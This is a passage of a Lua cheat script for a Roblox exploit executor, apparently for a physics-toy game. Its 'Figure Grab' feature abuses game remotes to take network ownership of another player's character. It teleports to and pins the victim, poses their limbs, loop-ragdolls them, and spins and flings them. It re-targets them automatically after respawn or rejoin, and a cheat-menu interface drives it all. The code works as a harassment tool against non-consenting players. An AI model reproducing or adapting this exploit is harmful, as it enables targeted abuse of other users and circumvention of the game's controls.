    FGM.State.PersistentGrabActive = true
    FGM.State.PersistentGrabThread = task.spawn(function()
        while FGM.State.PersistentGrabActive do
            task.wait(0.1)

            local state = FGM.State
            local target = state.TargetCharacter

            if not target or not state.FigureGrabEnabled then
                continue
            end

            local myChar = FGM.LocalPlayer.Character

            if not myChar then
                continue
            end

            local myHRP = myChar:FindFirstChild('HumanoidRootPart')
            local targetHRP = target:FindFirstChild('HumanoidRootPart')

            if not myHRP or not targetHRP then
                continue
            end

            _FireDestroyLine(targetHRP)
            _FireSetNetworkOwner(targetHRP, targetHRP.CFrame)

            local dist = (targetHRP.Position - myHRP.Position).Magnitude

            if dist >= FGM.Configuration.AutoTPDistance then
                if not state.DistanceTPInProgress then
                    state.DistanceTPInProgress = true

                    task.spawn(function()
                        FGM.ExecuteGrabTP(target)
                        task.wait(0.3)

                        state.DistanceTPInProgress = false
                    end)
                end
            end
        end
    end)
end
function FGM.StopPersistentGrab()
    FGM.State.PersistentGrabActive = false

    if FGM.State.PersistentGrabThread then
        pcall(function()
            task.cancel(FGM.State.PersistentGrabThread)
        end)

        FGM.State.PersistentGrabThread = nil
    end
end
function FGM.WaitForCharacterReady(targetPlayer, timeout)
    timeout = timeout or 15

    local deadline = tick() + timeout

    while tick() < deadline do
        local char = targetPlayer.Character

        if char and char.Parent and char:FindFirstChild('HumanoidRootPart') and char:FindFirstChild('Torso') and char:FindFirstChild('Humanoid') and char.Humanoid.Health > 0 then
            return char
        end

        task.wait(0.15)
    end

    return nil
end
function FGM.SpawnRagdoll()
    local MyChar = FGM.GetCharacter(FGM.LocalPlayer)

    if not MyChar then
        return
    end

    local MyHRP = MyChar:FindFirstChild('HumanoidRootPart')

    if not MyHRP then
        return
    end

    local ok, pallet = pcall(function()
        return spawntoy('PalletLightBrown', MyHRP.CFrame * CFrame.new(0, 10, 20))
    end)

    if not ok or not pallet then
        return
    end

    FGM.State.PalletForRagdoll = pallet

    local waited = 0

    while not (pallet and pallet:FindFirstChild('SoundPart')) and waited < 5 do
        task.wait(0.05)

        waited = waited + 0.05
    end

    if not pallet:FindFirstChild('SoundPart') then
        return
    end

    waited = 0

    while not pallet.SoundPart:FindFirstChild('PartOwner') and waited < 5 do
        task.wait(0.05)
        pcall(function()
            sno(pallet.SoundPart)
        end)

        waited = waited + 0.05
    end

    pcall(function()
        pallet.SoundPart.AssemblyLinearVelocity = Vector3.new(0, 1e9, 0)
    end)

    for _, v in pairs(pallet:GetChildren())do
        if v:IsA('Part') then
            pcall(function()
                v.CanCollide = false
                v.CanQuery = false
                v.Transparency = 1
            end)
        end
    end

    pallet.Name = 'PalletForRagdoll'

    if FGM.State.RagdollConnections.PalletDestroying then
        FGM.State.RagdollConnections.PalletDestroying:Disconnect()
    end

    FGM.State.RagdollConnections.PalletDestroying = pallet.Destroying:Once(function()
        if FGM.State.LoopRagdollEnabled then
            FGM.SpawnRagdoll()
        end
    end)
end
function FGM.StartLoopRagdoll()
    FGM.State.LoopRagdollEnabled = true

    FGM.SpawnRagdoll()
    task.spawn(function()
        while FGM.State.LoopRagdollEnabled and task.wait(0.05) do
            local target = FGM.State.TargetCharacter
            local pallet = FGM.State.PalletForRagdoll

            if target and pallet and pallet:FindFirstChild('SoundPart') then
                local hum = target:FindFirstChild('Humanoid')
                local ragdolled = hum and hum:FindFirstChild('Ragdolled')
                local hrp = target:FindFirstChild('HumanoidRootPart')

                if ragdolled and not ragdolled.Value and hrp then
                    pcall(function()
                        pallet.SoundPart.AssemblyLinearVelocity = Vector3.new(0, 1000, 0)
                        pallet.SoundPart.CFrame = hrp.CFrame
                    end)
                    task.wait(0.05)
                    pcall(function()
                        pallet.SoundPart.CFrame = CFrame.new(0, 1e9, 0)
                    end)
                end
            end
        end
    end)
end
function FGM.StopLoopRagdoll()
    FGM.State.LoopRagdollEnabled = false

    if FGM.State.RagdollConnections.PalletDestroying then
        FGM.State.RagdollConnections.PalletDestroying:Disconnect()

        FGM.State.RagdollConnections.PalletDestroying = nil
    end

    local inv = FGM.LocalPlayer.Backpack

    if inv and inv:FindFirstChild('PalletForRagdoll') then
        pcall(function()
            DestroyToy:FireServer(inv.PalletForRagdoll)
        end)
    end
    if FGM.State.PalletForRagdoll and FGM.State.PalletForRagdoll.Parent then
        pcall(function()
            DestroyToy:FireServer(FGM.State.PalletForRagdoll)
        end)
    end

    FGM.State.PalletForRagdoll = nil
end
function FGM.ReattachToCharacter(newCharacter)
    local state = FGM.State

    if not state.FigureGrabEnabled then
        return
    end

    local myChar = FGM.GetCharacter(FGM.LocalPlayer)

    if not myChar then
        return
    end

    FGM.StopLoopRagdoll()
    task.wait(0.1)

    state.TargetCharacter = newCharacter
    state.ActiveNetworkTarget = newCharacter:FindFirstChild('HumanoidRootPart')

    SetupBodyParts(newCharacter)

    local myHRP = myChar:FindFirstChild('HumanoidRootPart')
    local targetHRP = newCharacter:FindFirstChild('HumanoidRootPart')

    if myHRP and targetHRP then
        local dist = (targetHRP.Position - myHRP.Position).Magnitude

        if dist >= 5 then
            local savedPos = myHRP.CFrame

            pcall(function()
                tp(myHRP, targetHRP)
            end)
            task.wait(0.25)
            pcall(function()
                sno(targetHRP)
            end)
            task.wait(0.05)

            myHRP.AssemblyLinearVelocity = Vector3.zero
            myHRP.AssemblyAngularVelocity = Vector3.zero
            myHRP.CFrame = savedPos

            task.wait(0.2)
        end
    end

    FGM.ExecuteGrabTP(newCharacter)
    task.wait(0.1)
    FGM.StartLoopRagdoll()

    if state.HighlightedLimb then
        FGM.ApplyLimbHighlight(state.HighlightedLimb)
    end
end
function FGM.WatchForRespawn(targetPlayer)
    if FGM.State.RespawnConnection then
        pcall(function()
            FGM.State.RespawnConnection:Disconnect()
        end)

        FGM.State.RespawnConnection = nil
    end

    FGM.State.RespawnConnection = targetPlayer.CharacterAdded:Connect(function()
        if not FGM.State.FigureGrabEnabled then
            return
        end

        local readyChar = FGM.WaitForCharacterReady(targetPlayer, 15)

        if not readyChar then
            return
        end

        FGM.ReattachToCharacter(readyChar)
    end)
end
function FGM.WatchForRejoin(targetPlayer)
    if FGM.State.RejoinConnection then
        pcall(function()
            FGM.State.RejoinConnection:Disconnect()
        end)

        FGM.State.RejoinConnection = nil
    end

    local targetUserId = targetPlayer.UserId
    local removingConn

    removingConn = FGM.Players.PlayerRemoving:Connect(function(leavingPlayer)
        if leavingPlayer.UserId ~= targetUserId then
            return
        end
        if not FGM.State.FigureGrabEnabled then
            pcall(function()
                removingConn:Disconnect()
            end)

            FGM.State.RejoinConnection = nil

            return
        end

        task.spawn(function()
            local rejoinConn

            rejoinConn = FGM.Players.PlayerAdded:Connect(function(newPlayer)
                if newPlayer.UserId ~= targetUserId then
                    return
                end

                pcall(function()
                    rejoinConn:Disconnect()
                end)
                pcall(function()
                    removingConn:Disconnect()
                end)

                FGM.State.RejoinConnection = nil

                if not FGM.State.FigureGrabEnabled then
                    return
                end

                local readyChar = FGM.WaitForCharacterReady(newPlayer, 30)

                if not readyChar then
                    return
                end

                FGM.State.TargetPlayer = newPlayer

                FGM.WatchForRespawn(newPlayer)
                FGM.WatchForRejoin(newPlayer)
                FGM.ReattachToCharacter(readyChar)
            end)
        end)
    end)
    FGM.State.RejoinConnection = removingConn
end
function FGM.CopyAnimationsFromLimbs()
    if not FGM.State.AnimationCopyEnabled then
        return
    end
    if not FGM.State.TargetCharacter then
        return
    end

    local MyCharacter = FGM.GetCharacter(FGM.LocalPlayer)

    if not MyCharacter then
        return
    end

    local MyHRP = MyCharacter:FindFirstChild('HumanoidRootPart')
    local MyTorso = MyCharacter:FindFirstChild('Torso')
    local TargetTorso = FGM.State.TargetCharacter:FindFirstChild('Torso')

    if not MyHRP or not MyTorso or not TargetTorso then
        return
    end

    local cfg = FGM.Configuration
    local holdCFrame = MyHRP.CFrame * CFrame.new(cfg.HoldPosition.X, cfg.HoldPosition.Y, cfg.HoldPosition.Z) * CFrame.Angles(math.rad(cfg.HoldRotation.X), math.rad(cfg.HoldRotation.Y), math.rad(cfg.HoldRotation.Z))

    pcall(function()
        TargetTorso.CFrame = holdCFrame

        local torsoRelative = MyHRP.CFrame:ToObjectSpace(MyTorso.CFrame)

        TargetTorso.CFrame = TargetTorso.CFrame * torsoRelative.Rotation
        TargetTorso.Velocity = FGM.State.VectorZero
        TargetTorso.RotVelocity = FGM.State.VectorZero
    end)

    local limbs = {
        'Head',
        'Right Arm',
        'Left Arm',
        'Right Leg',
        'Left Leg',
    }

    for _, limbName in ipairs(limbs)do
        local myPart = MyCharacter:FindFirstChild(limbName)
        local targetPart = FGM.State.TargetCharacter:FindFirstChild(limbName)

        if myPart and targetPart then
            pcall(function()
                local relative = MyTorso.CFrame:ToObjectSpace(myPart.CFrame)

                targetPart.CFrame = TargetTorso.CFrame:ToWorldSpace(relative)
                targetPart.Velocity = FGM.State.VectorZero
                targetPart.RotVelocity = FGM.State.VectorZero
            end)
        end
    end
end
function FGM.CheckDistanceAndTP(myHRP, targetChar) end
function RunHeartbeat(MyCharacter)
    local cfg = FGM.Configuration
    local state = FGM.State
    local zero = state.VectorZero
    local bodyParts = {
        'Head',
        'Left Arm',
        'Right Arm',
        'Left Leg',
        'Right Leg',
    }
    local lastTime = tick()

    if state.FigureGrabConnection then
        pcall(function()
            state.FigureGrabConnection:Disconnect()
        end)
    end

    state.FigureGrabConnection = FGM.RunService.Heartbeat:Connect(function()
        local now = tick()
        local dt = math.min(now - lastTime, 0.1)

        lastTime = now

        local target = state.TargetCharacter

        if not target or not MyCharacter then
            return
        end

        local MyRoot = MyCharacter:FindFirstChild('HumanoidRootPart')
        local TargetTorso = target:FindFirstChild('Torso')

        if not MyRoot or not TargetTorso then
            return
        end
        if state.SpinEnabled then
            state.SpinAngle = (state.SpinAngle + state.SpinSpeed * dt) % 360
        end
        if state.OscillateEnabled then
            state.OscillateTimer = state.OscillateTimer + dt
        end

        local holdOffsetZ = cfg.HoldPosition.Z

        if state.OscillateEnabled then
            holdOffsetZ = holdOffsetZ + math.sin(state.OscillateTimer * state.OscillateSpeed * math.pi * 2) * state.OscillateAmount
        end

        local baseHoldCFrame = MyRoot.CFrame * CFrame.new(cfg.HoldPosition.X, cfg.HoldPosition.Y, holdOffsetZ) * CFrame.Angles(math.rad(cfg.HoldRotation.X), math.rad(cfg.HoldRotation.Y), math.rad(cfg.HoldRotation.Z))

        if state.HoldAtCameraEnabled then
            local cam = FGM.Workspace.CurrentCamera

            baseHoldCFrame = cam.CFrame * CFrame.new(0, 0, -math.abs(cfg.HoldPosition.Z))
        end
        if state.GravityFlipEnabled then
            local pos = baseHoldCFrame.Position
            local myY = MyRoot.Position.Y
            local flippedY = myY - (pos.Y - myY)
            local rot = baseHoldCFrame.Rotation

            baseHoldCFrame = CFrame.new(pos.X, flippedY, pos.Z) * rot
        end

        local holdCFrame = baseHoldCFrame

        if state.ForceLookAtEnabled then
            local lookDir = (MyRoot.Position - baseHoldCFrame.Position)

            if lookDir.Magnitude > 0.01 then
                holdCFrame = CFrame.new(baseHoldCFrame.Position, baseHoldCFrame.Position + lookDir)
            end
        end
        if state.ForceUprightEnabled then
            local p = holdCFrame.Position

            holdCFrame = CFrame.new(p) * CFrame.Angles(0, math.rad(cfg.HoldRotation.Y), 0)
        end
        if state.LockRotationEnabled then
            holdCFrame = CFrame.new(holdCFrame.Position) * state.LockedRotation
        end
        if state.SpinEnabled then
            holdCFrame = holdCFrame * CFrame.Angles(0, math.rad(state.SpinAngle), 0)
        end
        if state.FreezeLimbsEnabled and next(state.FrozenCFrames) then
            for partName, frozenCF in pairs(state.FrozenCFrames)do
                local part = target:FindFirstChild(partName)

                if part and part.Parent then
                    pcall(function()
                        part.CFrame = frozenCF
                        part.Velocity = zero
                        part.RotVelocity = zero
                    end)
                end
            end

            if cfg.DampingEnabled then
                local prev = state.SmoothedCFrames.Torso or holdCFrame
                local alpha = math.min(1, cfg.DampingSpeed * dt)

                state.SmoothedCFrames.Torso = LerpCFrame(prev, holdCFrame, alpha)

                pcall(function()
                    TargetTorso.CFrame = state.SmoothedCFrames.Torso
                    TargetTorso.Velocity = zero
                    TargetTorso.RotVelocity = zero
                end)
            else
                pcall(function()
                    TargetTorso.CFrame = holdCFrame
                    TargetTorso.Velocity = zero
                    TargetTorso.RotVelocity = zero
                end)
            end

            _FireSetNetworkOwner(state.ActiveNetworkTarget, holdCFrame)

            return
        end
        if cfg.DampingEnabled then
            local prev = state.SmoothedCFrames.Torso or holdCFrame
            local alpha = math.min(1, cfg.DampingSpeed * dt)

            state.SmoothedCFrames.Torso = LerpCFrame(prev, holdCFrame, alpha)

            pcall(function()
                TargetTorso.CFrame = state.SmoothedCFrames.Torso
                TargetTorso.Velocity = zero
                TargetTorso.RotVelocity = zero
            end)
        else
            pcall(function()
                TargetTorso.CFrame = holdCFrame
                TargetTorso.Velocity = zero
                TargetTorso.RotVelocity = zero
            end)
        end
        if state.VelSuppressEnabled then
            for _, part in pairs(target:GetChildren())do
                if part:IsA('BasePart') then
                    pcall(function()
                        part.AssemblyLinearVelocity = zero
                        part.AssemblyAngularVelocity = zero
                    end)
                end
            end
        end
        if state.AnimationCopyEnabled then
            FGM.CopyAnimationsFromLimbs()
        else
            local torsoCF = TargetTorso.CFrame

            for _, partName in pairs(bodyParts)do
                local part = target:FindFirstChild(partName)

                if part and part.Parent then
                    local targetCF = BuildTargetCFrame(partName, torsoCF, cfg)

                    if targetCF then
                        if cfg.DampingEnabled then
                            local prev = state.SmoothedCFrames[partName] or targetCF
                            local alpha = math.min(1, cfg.DampingSpeed * dt)

                            state.SmoothedCFrames[partName] = LerpCFrame(prev, targetCF, alpha)

                            pcall(function()
                                part.CFrame = state.SmoothedCFrames[partName]
                                part.Velocity = zero
                                part.RotVelocity = zero
                            end)
                        else
                            pcall(function()
                                part.CFrame = targetCF
                                part.Velocity = zero
                                part.RotVelocity = zero
                            end)
                        end
                    end
                end
            end
        end

        _FireSetNetworkOwner(state.ActiveNetworkTarget, holdCFrame)
    end)
end
function FGM.GetPlayerList()
    local list = {}

    for _, plr in pairs(FGM.Players:GetPlayers())do
        if plr ~= FGM.LocalPlayer then
            table.insert(list, plr.Name)
        end
    end

    return list
end
function FGM.GrabPlayerByName(playerName)
    local targetPlayer = FGM.Players:FindFirstChild(playerName)

    if not targetPlayer then
        return
    end

    local targetChar = targetPlayer.Character

    if not targetChar then
        return
    end
    if not targetChar:FindFirstChild('Torso') then
        return
    end

    local MyCharacter = FGM.GetCharacter(FGM.LocalPlayer)

    if not MyCharacter then
        return
    end
    if FGM.State.FigureGrabEnabled then
        FGM.ToggleFigureGrab()
        task.wait(0.1)
    end

    local state = FGM.State

    state.TargetCharacter = targetChar
    state.TargetPlayer = targetPlayer
    state.FigureGrabEnabled = true
    state.LastGrabTargetRef = targetChar:FindFirstChild('HumanoidRootPart')
    state.ActiveNetworkTarget = targetChar:FindFirstChild('HumanoidRootPart')
    FGM.Configuration.LineDistance = 5

    FGM.ExecuteGrabTP(targetChar)
    task.wait(0.15)
    SetupBodyParts(targetChar)
    FGM.StartLoopRagdoll()
    FGM.StartPersistentGrab()
    FGM.WatchForRespawn(targetPlayer)
    FGM.WatchForRejoin(targetPlayer)
    RunHeartbeat(MyCharacter)

    if state.HighlightedLimb then
        FGM.ApplyLimbHighlight(state.HighlightedLimb)
    end
end
function FGM.ToggleFigureGrab()
    if not FGM.State.FigureGrabEnabled then
        local MouseTarget = FGM.Mouse.Target

        if not MouseTarget then
            return
        end

        local targetChar = MouseTarget.Parent
        local MyCharacter = FGM.GetCharacter(FGM.LocalPlayer)

        if not targetChar or not MyCharacter then
            return
        end
        if not targetChar:FindFirstChild('Torso') then
            return
        end

        local targetPlayer = nil

        for _, plr in pairs(FGM.Players:GetPlayers())do
            if plr.Character == targetChar then
                targetPlayer = plr

                break
            end
        end

        local state = FGM.State

        state.TargetCharacter = targetChar
        state.TargetPlayer = targetPlayer
        state.FigureGrabEnabled = true
        state.LastGrabTargetRef = MouseTarget
        state.ActiveNetworkTarget = targetChar:FindFirstChild('HumanoidRootPart') or MouseTarget
        FGM.Configuration.LineDistance = 5

        FGM.ExecuteGrabTP(targetChar)
        task.wait(0.15)
        SetupBodyParts(targetChar)
        FGM.StartLoopRagdoll()
        FGM.StartPersistentGrab()

        if targetPlayer then
            FGM.WatchForRespawn(targetPlayer)
            FGM.WatchForRejoin(targetPlayer)
        end

        RunHeartbeat(MyCharacter)

        if state.HighlightedLimb then
            FGM.ApplyLimbHighlight(state.HighlightedLimb)
        end
    else
        local state = FGM.State

        if state.FlingOnReleaseEnabled and state.TargetCharacter then
            local targetHRP = state.TargetCharacter:FindFirstChild('HumanoidRootPart')
            local myChar = FGM.GetCharacter(FGM.LocalPlayer)
            local myHRP = myChar and myChar:FindFirstChild('HumanoidRootPart')

            if targetHRP and myHRP then
                local flingDir = (targetHRP.Position - myHRP.Position)

                if flingDir.Magnitude > 0 then
                    flingDir = flingDir.Unit
                end

                pcall(function()
                    targetHRP.AssemblyLinearVelocity = flingDir * state.FlingForce
                end)
            end
        end

        FGM.ClearLimbHighlight()
        FGM.StopPersistentGrab()

        state.FigureGrabEnabled = false
        state.AnimationCopyEnabled = false
        state.SmoothedCFrames = {}
        state.FrozenCFrames = {}
        state.SpinAngle = 0
        state.OscillateTimer = 0
        state.DistanceTPInProgress = false
        state.ActiveNetworkTarget = nil

        FGM.StopLoopRagdoll()

        if state.FigureGrabConnection then
            pcall(function()
                state.FigureGrabConnection:Disconnect()
            end)

            state.FigureGrabConnection = nil
        end
        if state.RespawnConnection then
            pcall(function()
                state.RespawnConnection:Disconnect()
            end)

            state.RespawnConnection = nil
        end
        if state.RejoinConnection then
            pcall(function()
                state.RejoinConnection:Disconnect()
            end)

            state.RejoinConnection = nil
        end

        state.TargetCharacter = nil
        state.TargetPlayer = nil
        state.LastGrabTargetRef = nil
    end
end
function FGM.SetAnimationCopy(enabled)
    FGM.State.AnimationCopyEnabled = enabled
end
function FGM.ResetPose()
    local limbSections = {
        'LeftArmPosition',
        'LeftArmRotation',
        'RightArmPosition',
        'RightArmRotation',
        'LeftLegPosition',
        'LeftLegRotation',
        'RightLegPosition',
        'RightLegRotation',
        'HeadPosition',
        'HeadRotation',
        'HoldRotation',
    }

    for _, section in ipairs(limbSections)do
        local t = FGM.Configuration[section]

        if t then
            for axis in pairs(t)do
                t[axis] = 0
            end
        end
    end

    FGM.Configuration.HoldPosition = {
        X = 0,
        Y = 0,
        Z = -5,
    }
end
function FGM.ApplyPreset(presetName)
    local preset = FGM.Presets[presetName]

    if not preset then
        return
    end

    for section, values in pairs(preset)do
        if FGM.Configuration[section] then
            for axis, value in pairs(values)do
                FGM.Configuration[section][axis] = value
            end
        end
    end
end
function FGM.UpdateConfig(section, axis, rawValue)
    local cfg = FGM.Configuration

    if cfg[section] and cfg[section][axis] ~= nil then
        cfg[section][axis] = FGM.ApplySnap(section, axis, rawValue)
    end
end
function FGM.SnapshotLimbsForFreeze()
    local state = FGM.State
    local target = state.TargetCharacter

    state.FrozenCFrames = {}

    if not target then
        return
    end

    for _, name in ipairs({
        'Head',
        'Left Arm',
        'Right Arm',
        'Left Leg',
        'Right Leg',
    })do
        local part = target:FindFirstChild(name)

        if part then
            state.FrozenCFrames[name] = part.CFrame
        end
    end
end
function FGM.GetCurrentConfigSnapshot()
    local cfg = FGM.Configuration
    local snapshot = {}
    local keys = {
        'HoldPosition',
        'HoldRotation',
        'LeftArmPosition',
        'LeftArmRotation',
        'RightArmPosition',
        'RightArmRotation',
        'LeftLegPosition',
        'LeftLegRotation',
        'RightLegPosition',
        'RightLegRotation',
        'HeadPosition',
        'HeadRotation',
    }

    for _, key in ipairs(keys)do
        if cfg[key] then
            snapshot[key] = {
                X = cfg[key].X,
                Y = cfg[key].Y,
                Z = cfg[key].Z,
            }
        end
    end

    return snapshot
end
function FGM.SaveCustomPreset(name)
    if not name or name == '' then
        return false
    end

    FGM.CustomPresets[name] = FGM.GetCurrentConfigSnapshot()

    return true
end
function FGM.LoadCustomPreset(name)
    local preset = FGM.CustomPresets[name]

    if not preset then
        return false
    end

    for section, values in pairs(preset)do
        if FGM.Configuration[section] then
            for axis, value in pairs(values)do
                FGM.Configuration[section][axis] = value
            end
        end
    end

    return true
end
function FGM.DeleteCustomPreset(name)
    if not FGM.CustomPresets[name] then
        return false
    end

    FGM.CustomPresets[name] = nil

    return true
end
function FGM.GetCustomPresetNames()
    local names = {}

    for name in pairs(FGM.CustomPresets)do
        table.insert(names, name)
    end

    table.sort(names)

    return names
end
function GetActiveSections()
    local limb = FGM.State.SelectedLimb

    return LIMB_SECTION_MAP[limb] or LIMB_SECTION_MAP.Torso
end

if not Tabs or not Tabs.FigureTab then
    return
end

local FigureTab = Tabs.FigureTab

GrpTarget = FigureTab:AddLeftGroupbox('Target', 'user')
GrpSettings = FigureTab:AddLeftGroupbox('Settings', 'settings')
GrpPhysics = FigureTab:AddLeftGroupbox('Physics', 'activity')
GrpMotion = FigureTab:AddLeftGroupbox('Movement', 'wind')
GrpLimb = FigureTab:AddRightGroupbox('Limb Control', 'sliders-horizontal')
GrpSnap = FigureTab:AddRightGroupbox('Snap Grid', 'grid')
GrpPoses = FigureTab:AddRightGroupbox('Poses', 'bookmark')
GrpActions = FigureTab:AddRightGroupbox('Actions', 'zap')
FGM = FGM or {}
FGM.State = FGM.State or {}
FGM.Configuration = FGM.Configuration or {}
Toggles = Toggles or {}
Options = Options or {}
Notifications = Notifications or {}

local FGMainToggle = GrpTarget:AddCheckbox('FG_GrabToggle', {
    Text = 'Grab Active',
    Default = false,
})
local FGKeybind = FGMainToggle:AddKeyPicker('FG_GrabKeybind', {
    Default = 'V',
    Text = 'Toggle Grab',
    Mode = 'Toggle',
    Callback = function()
        if FGM.ToggleFigureGrab then
            FGM.ToggleFigureGrab()
        end
    end,
})

FGMainToggle:OnChanged(function(v)
    if FGM.State.FigureGrabEnabled ~= v then
        if v then
            startPlotWatch()
        else
            stopPlotWatch()
        end
        if FGM.ToggleFigureGrab then
            FGM.ToggleFigureGrab()
        end
    end
end)
GrpSettings:AddLabel('<b>Behaviour</b>')
GrpSettings:AddCheckbox('FG_AnimCopyToggle', {
    Text = 'Mirror My Animations',
    Default = false,
})
Toggles.FG_AnimCopyToggle:OnChanged(function(v)
    if FGM.SetAnimationCopy then
        FGM.SetAnimationCopy(v)
    end

    notify(v and 'Animation mirroring on' or 'Animation mirroring off', 2)
end)
GrpSettings:AddDivider()
GrpSettings:AddLabel('<b>Damping</b>')
GrpSettings:AddCheckbox('FG_DampingEnabled', {
    Text = 'Smooth Movement',
    Default = true,
})
Toggles.FG_DampingEnabled:OnChanged(function(v)
    FGM.Configuration.DampingEnabled = v

    if not v then
        FGM.State.SmoothedCFrames = {}
    end
end)
GrpSettings:AddSlider('FG_DampingSpeed', {
    Text = 'Damping Speed',
    Default = 12,
    Min = 1,
    Max = 60,
    Rounding = 0,
    Callback = function(v)
        FGM.Configuration.DampingSpeed = v
    end,
})
GrpPhysics:AddLabel('<b>Constraints</b>')
GrpPhysics:AddCheckbox('FG_VelSuppress', {
    Text = 'Zero All Velocities',
    Default = false,
})
Toggles.FG_VelSuppress:OnChanged(function(v)
    FGM.State.VelSuppressEnabled = v
end)
GrpPhysics:AddCheckbox('FG_LockRotation', {
    Text = 'Lock Torso Rotation',
    Default = false,
})
Toggles.FG_LockRotation:OnChanged(function(v)
    FGM.State.LockRotationEnabled = v
end)
GrpPhysics:AddCheckbox('FG_ForceUpright', {
    Text = 'Keep Target Upright',
    Default = false,
})
Toggles.FG_ForceUpright:OnChanged(function(v)
    FGM.State.ForceUprightEnabled = v
end)
GrpPhysics:AddCheckbox('FG_ForceLookAt', {
    Text = 'Face Toward Me',
    Default = false,
})
Toggles.FG_ForceLookAt:OnChanged(function(v)
    FGM.State.ForceLookAtEnabled = v
end)
GrpPhysics:AddDivider()
GrpPhysics:AddLabel('<b>Hold</b>')
GrpPhysics:AddCheckbox('FG_HoldAtCamera', {
    Text = 'Anchor to Camera',
    Default = false,
})
Toggles.FG_HoldAtCamera:OnChanged(function(v)
    FGM.State.HoldAtCameraEnabled = v
end)
GrpMotion:AddLabel('<b>Effects</b>')
GrpMotion:AddCheckbox('FG_Spin', {
    Text = 'Spin Target',
    Default = false,
})
Toggles.FG_Spin:OnChanged(function(v)
    FGM.State.SpinEnabled = v
    FGM.State.SpinAngle = 0
end)
GrpMotion:AddSlider('FG_SpinSpeed', {
    Text = 'Spin Speed',
    Default = 180,
    Min = 10,
    Max = 720,
    Rounding = 0,
    Callback = function(v)
        FGM.State.SpinSpeed = v
    end,
})
GrpMotion:AddDivider()
GrpMotion:AddCheckbox('FG_Oscillate', {
    Text = '<b>[FLOAT]</b> Oscillate',
    Default = false,
})

if Toggles.FG_Oscillate then
    Toggles.FG_Oscillate:OnChanged(function(v)
        FGM.State.OscillateEnabled = v
        FGM.State.OscillateTimer = 0
    end)
end

GrpMotion:AddSlider('FG_OscillateSpeed', {
    Text = 'Float Speed',
    Default = 2,
    Min = 1,
    Max = 10,
    Rounding = 1,
    Callback = function(v)
        FGM.State.OscillateSpeed = v
    end,
})
GrpMotion:AddSlider('FG_OscillateAmount', {
    Text = 'Float Distance',
    Default = 3,
    Min = 1,
    Max = 20,
    Rounding = 1,
    Callback = function(v)
        FGM.State.OscillateAmount = v
    end,
})
GrpLimb:AddLabel('<b>Active Limb</b>')
GrpLimb:AddDropdown('FG_LimbSelector', {
    Values = LIMB_OPTIONS or {
        'Head',
    },
    Default = 'Head',
    Multi = false,
    Text = 'Select A Limb',
    Callback = function(selected)
        FGM.State.SelectedLimb = selected

        if FGM.ApplyLimbHighlight then
            FGM.ApplyLimbHighlight(selected)
        end
    end,
})
GrpLimb:AddDivider()
GrpLimb:AddLabel('<b>Position</b>')

function updateLimb(section, axis, value)
    if FGM.UpdateConfig then
        FGM.UpdateConfig(section, axis, value)
    end
end

GrpLimb:AddSlider('FG_LimbPosX', {
    Text = 'Left  /  Right',
    Default = 0,
    Min = -50,
    Max = 50,
    Rounding = 1,
    Callback = function(v)
        updateLimb(GetActiveSections().pos, 'X', v)
    end,
})
GrpLimb:AddSlider('FG_LimbPosY', {
    Text = 'Up  /  Down',
    Default = 0,
    Min = -50,
    Max = 50,
    Rounding = 1,
    Callback = function(v)
        updateLimb(GetActiveSections().pos, 'Y', v)
    end,
})
GrpLimb:AddSlider('FG_LimbPosZ', {
    Text = 'Forward  /  Back',
    Default = -5,
    Min = -50,
    Max = 50,
    Rounding = 1,
    Callback = function(v)
        updateLimb(GetActiveSections().pos, 'Z', v)
    end,
})
GrpLimb:AddDivider()
GrpLimb:AddLabel('<b>Rotation</b>')
GrpLimb:AddSlider('FG_LimbRotX', {
    Text = 'Pitch  (Up / Down)',
    Default = 0,
    Min = 0,
    Max = 360,
    Rounding = 0,
    Callback = function(v)
        updateLimb(GetActiveSections().rot, 'X', v)
    end,
})
GrpLimb:AddSlider('FG_LimbRotY', {
    Text = 'Yaw  (Left / Right)',
    Default = 0,
    Min = 0,
    Max = 360,
    Rounding = 0,
    Callback = function(v)
        updateLimb(GetActiveSections().rot, 'Y', v)
    end,
})
GrpLimb:AddSlider('FG_LimbRotZ', {
    Text = 'Roll  (Tilt)',
    Default = 0,
    Min = 0,
    Max = 360,
    Rounding = 0,
    Callback = function(v)
        updateLimb(GetActiveSections().rot, 'Z', v)
    end,
})
GrpSnap:AddLabel('<b>Snap Grid</b>')
GrpSnap:AddCheckbox('FG_SnapEnabled', {
    Text = 'Enable Snap',
    Default = false,
})
Toggles.FG_SnapEnabled:OnChanged(function(v)
    FGM.Configuration.SnapEnabled = v
end)
GrpSnap:AddSlider('FG_SnapPosStep', {
    Text = 'Position Step',
    Default = 0.5,
    Min = 0.1,
    Max = 5,
    Rounding = 1,
    Callback = function(v)
        FGM.Configuration.SnapPosStep = v
    end,
})
GrpSnap:AddSlider('FG_SnapRotStep', {
    Text = 'Rotation Step',
    Default = 15,
    Min = 1,
    Max = 90,
    Rounding = 0,
    Callback = function(v)
        FGM.Configuration.SnapRotStep = v
    end,
})
GrpPoses:AddLabel('<b>Built-in Poses</b>')
GrpPoses:AddDropdown('FGM_PresetPose', {
    Values = {
        'Pose1',
        'Pose2',
        'Pose3',
        'Pose4',
        'Pose5',
        'Pose6',
        'Pose7',
        'JojoStand',
    },
    Default = 'Pose1',
    Multi = false,
    Text = 'Select Pose',
})
GrpPoses:AddButton({
    Text = 'Apply Pose',
    Func = function()
        if FGM.ApplyPreset then
            local selected = Options.FGM_PresetPose and Options.FGM_PresetPose.Value

            FGM.ApplyPreset(selected)
            notify('Pose applied \u{2014} ' .. tostring(selected), 2)
        end
    end,
})
GrpPoses:AddButton({
    Text = 'Reset to Default Pose',
    Func = function()
        if FGM.ResetPose then
            FGM.ResetPose()
            notify('Pose reset to default', 2)
        end
    end,
})
GrpActions:AddLabel('<b>Actions</b>')
GrpActions:AddButton({
    Text = 'Force Re-Grab',
    Func = function()
        local target = FGM.State.TargetCharacter

        if not target then
            return
        end
        if FGM.ExecuteGrabTP then
            FGM.ExecuteGrabTP(target)
        end
    end,
})
GrpActions:AddButton({
    Text = 'Freeze Limbs',
    Func = function()
        if FGM.SnapshotLimbsForFreeze then
            FGM.SnapshotLimbsForFreeze()
        end

        FGM.State.FreezeLimbsEnabled = true
    end,
})
GrpActions:AddButton({
    Text = 'Unfreeze Limbs',
    Func = function()
        FGM.State.FreezeLimbsEnabled = false
        FGM.State.FrozenCFrames = {}

        notify('Limbs unfrozen', 2)
    end,
})
GrpActions:AddDivider()
GrpActions:AddButton({
    Text = 'Release Target',
    Func = function()
        if FGM.State.FigureGrabEnabled then
            stopPlotWatch()
            FGM.ToggleFigureGrab()
        else
